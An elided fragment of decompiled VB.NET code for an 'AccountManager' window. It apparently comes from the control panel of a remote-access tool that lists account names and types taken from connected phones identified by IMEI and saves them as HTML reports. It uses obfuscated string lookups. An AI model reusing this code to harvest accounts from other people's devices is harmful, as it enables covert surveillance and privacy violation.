...
Public Class AccountManager
    ...
    Private Sub AccountManager_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        MyBase.Icon = New System.Drawing.Icon(String.Concat(Store.Resources(1), "\Icons\window\win\14.ico"))
        ...
        Try
            ...
            If (Operators.CompareString(value, Store.BFF(Store.buff, CLng(83)), False) <> 0) Then
                If (Operators.CompareString(value, Store.BFF(Store.buff, CLng(84)), False) = 0) Then
                    ...
                    stringBuilder1.Append(String.Concat(New String() {"</tr><th>", Me.ViewManager.Columns(1).HeaderText, "</th><th>", Me.ViewManager.Columns(2).HeaderText, "</th><tr>"}))
                    ...
                    Do
                        ...
                        Dim str As String = String.Concat(Store.Resources(1), "\Icons\AccountManager\", strArrays1(0), ".png")
                        If (Not File.Exists(str)) Then
                            Dim str1 As String = String.Concat(Store.Resources(1), "\Icons\AccountManager\account.png")
                            bitmap = New System.Drawing.Bitmap(str1)
                        Else
                            bitmap = New System.Drawing.Bitmap(str)
                        End If
                        Me.ViewManager.Rows.Add(New Object() {Me.IMG(bitmap), strArrays1(0), strArrays1(1)})
                        stringBuilder2.Append(String.Concat(New String() {"</tr> <td>", strArrays1(0), "</td><td>", strArrays1(1), "</td><tr>" & vbCrLf & ""}))
                        num = num + 1
                    Loop While num <= length
                    If (stringBuilder2.Length > 0) Then
                        Store.StartThread(DirectCast((New Object() {stringBuilder, stringBuilder1, stringBuilder2, String.Concat(Me.TClient.ClientName, "_", Me.TClient.ClientImei), "AccountManager"}), Array))
                    End If
                End If
            End If
    ...
    Private Sub TProgressBar_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TProgressBar.Tick
        ...
        ElseIf (Not Me.TClient.IsClose) Then
            ...
            End If
            Me.ProgressBar1.Value = Me.TClient.mProgressBar(Store.BFF(Store.buff, CLng(76)), "null")
        Else
            Me.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(MyBase.Tag, Strings.Space(1)), "-> Connection Lost ..."))
            If (Me.ProgressBar1.Value <> 100) Then
                Me.ProgressBar1.Value = 100
